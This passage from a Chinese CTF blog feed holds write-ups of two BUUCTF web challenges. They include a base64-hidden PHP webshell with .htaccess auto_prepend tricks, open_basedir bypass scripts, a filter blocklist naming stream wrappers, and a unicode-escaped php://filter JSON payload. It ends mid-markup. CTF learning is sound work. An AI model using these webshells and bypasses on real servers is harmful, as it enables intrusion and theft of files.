class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;上传&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里指定的url是指目标网站地址，上传的文件会被寄存在目标网站的tmp目录上等待被处理，这里同时在访问目标网址时启动get_the_flag()函数，用于上传文件后能直接处理tmp目录中的文件。</p><h2 id="查看网页运行的php版本"><a href="#查看网页运行的php版本" class="headerlink" title="查看网页运行的php版本:"></a>查看网页运行的php版本:</h2><p><img src="/images/2024-2-18/image-20240213220802182.png" alt="image-20240213220802182"></p><p>php版本为7.2.19所以不能使用&lt;script language&#x3D;”php”&gt;@eval($_POST[‘pass’]);&lt;&#x2F;script&gt;进行绕过，所以要逃过对&lt;?的检测只能使用文件内容加密配合.htaccess文件加密文件内容，使用了.htaccess文件，就直接上传图片文件吧。</p><h2 id="准备上传文件"><a href="#准备上传文件" class="headerlink" title="准备上传文件:"></a>准备上传文件:</h2><h3 id="pass-php"><a href="#pass-php" class="headerlink" title="pass.php:"></a>pass.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a66<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;win!!!&quot;</span>;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>&#x3D;&gt;转化为绕过文件:</p><h3 id="pass-jpg"><a href="#pass-jpg" class="headerlink" title="pass.jpg:"></a>pass.jpg:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">GIF89a66<br><br>PD9waHAgZWNobyAid2luISEhIjtAZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4g<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213222006414.png" alt="image-20240213222006414"></p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess:"></a>.htaccess:</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><h4 id="添加XBM文件幻术头"><a href="#添加XBM文件幻术头" class="headerlink" title="添加XBM文件幻术头:"></a>添加XBM文件幻术头:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">#define width 1337<br><br>#define height 1337<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br><br>#define height 1337<br><br>php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./pass.jpg&quot;<br><br>AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213222127585.png" alt="image-20240213222127585"></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>x00x00x8ax39x8ax39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess<br></code></pre></td></tr></table></figure><p>这里采用方法一的.htaccess文件。</p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件:"></a>上传文件:</h2><h3 id="pass-jpg-1"><a href="#pass-jpg-1" class="headerlink" title="pass.jpg:"></a>pass.jpg:</h3><h4 id="上传"><a href="#上传" class="headerlink" title="上传:"></a>上传:</h4><p><img src="/images/2024-2-18/image-20240213225818685.png" alt="image-20240213225818685"></p><h4 id="响应结果"><a href="#响应结果" class="headerlink" title="响应结果:"></a>响应结果:</h4><p><img src="/images/2024-2-18/image-20240213225759507.png" alt="image-20240213225759507"></p><h3 id="htaccess-1"><a href="#htaccess-1" class="headerlink" title=".htaccess:"></a>.htaccess:</h3><h4 id="上传-1"><a href="#上传-1" class="headerlink" title="上传:"></a>上传:</h4><p><img src="/images/2024-2-18/image-20240213225924525.png" alt="image-20240213225924525"></p><h4 id="响应结果-1"><a href="#响应结果-1" class="headerlink" title="响应结果:"></a>响应结果:</h4><p><img src="/images/2024-2-18/image-20240213230120518.png" alt="image-20240213230120518"></p><h2 id="访问我们的pass-jpg"><a href="#访问我们的pass-jpg" class="headerlink" title="访问我们的pass.jpg:"></a>访问我们的pass.jpg:</h2><p><img src="/images/2024-2-18/image-20240213230241660.png" alt="image-20240213230241660"></p><h3 id="测试木马文件是否可用"><a href="#测试木马文件是否可用" class="headerlink" title="测试木马文件是否可用:"></a>测试木马文件是否可用:</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=phpinfo();<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213230347611.png" alt="image-20240213230347611"></p><p>我们的木马文件可以被使用！！！</p><h2 id="查看文件根目录"><a href="#查看文件根目录" class="headerlink" title="查看文件根目录:"></a>查看文件根目录:</h2><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213230511448.png" alt="image-20240213230511448"></p><p>没有回显内容，可能是对函数进行禁用了。</p><h2 id="查看phpinfo-了解禁用内容"><a href="#查看phpinfo-了解禁用内容" class="headerlink" title="查看phpinfo()了解禁用内容:"></a>查看phpinfo()了解禁用内容:</h2><p><img src="/images/2024-2-18/image-20240213230650369.png" alt="image-20240213230650369"></p><p>禁用了对系统命令的使用，所以只能采取蚁剑连接了。</p><h2 id="蚁剑连接木马文件"><a href="#蚁剑连接木马文件" class="headerlink" title="蚁剑连接木马文件:"></a>蚁剑连接木马文件:</h2><p><img src="/images/2024-2-18/image-20240213231219940.png" alt="image-20240213231219940"></p><h3 id="第一种方式：直接查看"><a href="#第一种方式：直接查看" class="headerlink" title="第一种方式：直接查看:"></a>第一种方式：直接查看:</h3><p>（前提是蚁剑拥有可以访问根目录中文件信息的权限）</p><h4 id="查看文件的根目录信息"><a href="#查看文件的根目录信息" class="headerlink" title="查看文件的根目录信息:"></a>查看文件的根目录信息:</h4><p><img src="/images/2024-2-18/image-20240213231338423.png" alt="image-20240213231338423"></p><p>发现一个flag相关文件</p><h4 id="打开THis-Is-tHe-F14g文件"><a href="#打开THis-Is-tHe-F14g文件" class="headerlink" title="打开THis_Is_tHe_F14g文件:"></a>打开THis_Is_tHe_F14g文件:</h4><p><img src="/images/2024-2-18/image-20240213231455476.png" alt="image-20240213231455476"></p><p>获得flag&#x3D;flag{7f878969-d964-4dfe-886b-00815550a1d6}</p><h3 id="第二种方式：在上传文件的目录中再创建一个shell-php用于获取文件信息："><a href="#第二种方式：在上传文件的目录中再创建一个shell-php用于获取文件信息：" class="headerlink" title="第二种方式：在上传文件的目录中再创建一个shell.php用于获取文件信息："></a>第二种方式：在上传文件的目录中再创建一个shell.php用于获取文件信息：</h3><p>（蚁剑无法直接获取根目录文件内容时以及）</p><h4 id="获取指定目录的文件信息"><a href="#获取指定目录的文件信息" class="headerlink" title="获取指定目录的文件信息:"></a>获取指定目录的文件信息:</h4><h5 id="新建文件shell1-php"><a href="#新建文件shell1-php" class="headerlink" title="新建文件shell1.php:"></a>新建文件shell1.php:</h5><h6 id="shell1-php"><a href="#shell1-php" class="headerlink" title="shell1.php:"></a>shell1.php:</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213232539210.png" alt="image-20240213232539210"></p><p><img src="/images/2024-2-18/image-20240213232556360.png" alt="image-20240213232556360"></p><p><img src="/images/2024-2-18/image-20240213233043246.png" alt="image-20240213233043246"></p><p><img src="/images/2024-2-18/image-20240213233319227.png" alt="image-20240213233319227"></p><h5 id="网页访问我们新建的shell1-php"><a href="#网页访问我们新建的shell1-php" class="headerlink" title="网页访问我们新建的shell1.php:"></a>网页访问我们新建的shell1.php:</h5><p>(由于是在当前目录下创建的shell1.php，所以访问时还是以当前目录下的shell1.php去启动运行该文件)</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/upload/tmp_f65a0ca982c669865231909b0ec85a0c/shell1.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213233439097.png" alt="image-20240213233439097"></p><p>获得一个文件：THis_Is_tHe_F14g</p><h4 id="获取指定目录下的文件的内容"><a href="#获取指定目录下的文件的内容" class="headerlink" title="获取指定目录下的文件的内容:"></a>获取指定目录下的文件的内容:</h4><h5 id="新建一个shell2-php"><a href="#新建一个shell2-php" class="headerlink" title="新建一个shell2.php:"></a>新建一个shell2.php:</h5><h6 id="shell2-php"><a href="#shell2-php" class="headerlink" title="shell2.php:"></a>shell2.php:</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;south&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/THis_Is_tHe_F14g&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213234142911.png" alt="image-20240213234142911"></p><p><img src="/images/2024-2-18/image-20240213234201910.png" alt="image-20240213234201910"></p><h5 id="网页访问我们新建的shell2-php"><a href="#网页访问我们新建的shell2-php" class="headerlink" title="网页访问我们新建的shell2.php:"></a>网页访问我们新建的shell2.php:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/upload/tmp_f65a0ca982c669865231909b0ec85a0c/shell2.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213234252121.png" alt="image-20240213234252121"></p><p>flag&#x3D;flag{7f878969-d964-4dfe-886b-00815550a1d6}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[HarekazeCTF2019]encode_and_encode</title>
    <link href="/2024/02/18/2024-02-18-%5BHarekazeCTF2019%5Dencode_and_encode/"/>
    <url>/2024/02/18/2024-02-18-%5BHarekazeCTF2019%5Dencode_and_encode/</url>
    
    <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/122724832">HarekazeCTF2019]encode_and_encode-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_51524329/article/details/121439731">文件包含&amp;PHP伪协议利用_-CSDN博客</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240212204331473.png" alt="image-20240212204331473"></p><h2 id="点击source-code查看源码"><a href="#点击source-code查看源码" class="headerlink" title="点击source code查看源码:"></a>点击source code查看源码:</h2><p><img src="/images/2024-2-18/image-20240212204440471.png" alt="image-20240212204440471"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计:"></a>代码审计:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// 判断source此参数是否为空，为空则返回false,不为空则展示脚本代码，同时退出脚本</span><br><span class="hljs-comment">// 所以source要为空</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-comment">// 设置黑名单字符串</span><br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br><span class="hljs-comment">// 将黑名单所有字符串整合成正则匹配</span><br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) <br>  &#123;<span class="hljs-comment">// 判断$str是否有黑名单数据</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// 获取用户传输的post请求的内容，可以是传参还有json数据</span><br><span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-comment">// 将json数据转化为关联数组的形式</span><br><span class="hljs-comment">// json_decode()可以解析unicode编码</span><br><span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 检查$json对象是否为空，$json数组中的page变量是否为空，以及用户传输的字符串内容是否存在黑名单数据</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 获取$json关联数组中的$page变量的内容</span><br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>   <span class="hljs-comment">//   文件打开函数（危险函数），获取$page路径所指向的文件内容</span><br>  <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$page</span>);<br>   <span class="hljs-comment">// content获取的内容为空，或者获取的$content的内容中含有黑名单数据则过滤   </span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-comment">// 将HarekazeCTF&#123;xxxxx&#125;内容替换为HarekazeCTF&#123;&lt;censored&gt;&#125;</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-comment">// 输出获取的文件内容</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]); <br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">这里要利用的危险代码为file_get_contents($page);所以是利用了file_get_contents()函数的漏洞，可以利用php伪协议(php://filter)获取文件数据流，然后通过file_get_contents()获取打开的文件数据流传递给相应的参数:<br>file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=文件路径&#x27;)<br><br>但是这里过滤了php，所以不能直接传伪协议，题目只对$body变量进行过滤，没有对$json数据进行过滤，这就可以使用unicode编码进行绕过，这是因为存在json_decode()可以解析unicode编码内容：<br>$json[&#x27;page&#x27;]=&#x27;php://filter/read=convert.base64-encode/resource=文件路径&#x27;<br>=&gt;<br>$body=&#123;&#x27;page&#x27;:unicode(&#x27;php://filter/read=convert.base64-encode/resource=文件路径&#x27;)&#125;<br></code></pre></td></tr></table></figure><h2 id="unicode编码脚本"><a href="#unicode编码脚本" class="headerlink" title="unicode编码脚本:"></a>unicode编码脚本:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unicodeEncrypt</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">mb_strlen</span>(<span class="hljs-variable">$str</span>);<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$char</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$i</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$result</span> .= <span class="hljs-string">&#x27;\u&#x27;</span> . <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">mb_convert_encoding</span>(<span class="hljs-variable">$char</span>, <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>, <span class="hljs-string">&#x27;UTF-8&#x27;</span>)));<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-comment">// 示例用法</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>;<br><span class="hljs-variable">$encryptedText</span> = <span class="hljs-title function_ invoke__">unicodeEncrypt</span>(<span class="hljs-variable">$text</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encryptedText</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0072\u0065\u0061\u0064\u003D\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067<br></code></pre></td></tr></table></figure><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload:"></a>构造payload:</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">POST<span class="hljs-punctuation">:</span><br>Content-Type<span class="hljs-punctuation">:</span> application/json<br><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0072\u0065\u0061\u0064\u003D\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212215242887.png" alt="image-20240212215242887"></p><figure class="highlight 